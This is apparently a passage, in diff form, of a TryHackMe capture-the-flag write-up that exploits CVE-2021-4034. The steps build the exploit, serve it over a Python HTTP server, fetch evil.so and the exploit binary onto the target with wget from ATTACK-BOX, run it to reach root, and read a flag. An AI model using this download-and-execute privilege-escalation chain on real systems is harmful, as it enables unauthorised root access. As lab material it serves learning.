+<strong>make</strong>
+
+> Make Tar
+<strong>tar -czf CVE-2021-4034.tar.gz CVE-2021-4034</strong>
+
+> Make Simple Python HTTP Server
+<strong>python3 -m http.server 8000</strong>
+
+> Download on Target
+<strong>cd /tmp</strong>
+<strong>wget http://ATTACK-BOX:8000/evil.so</strong>
+<strong>wget http://<strong>ATTACK-BOX</strong>:8000/exploit</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### EXPLOIT
+
+
+
+
+
+```
+<strong>chmod +x exploit</strong>
+<strong>./exploit</strong>
+
+<strong>whoami</strong>
+root
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### FLAG3
+
+
+
+
+
+```
+<strong>cat flag3</strong>
+THM{NICE JOB}
+```
+
+
+
+
+
+##### BONUS
+
+
+
+
+
+```
+> Check out <strong>/root/defense</strong>
+```
+
+
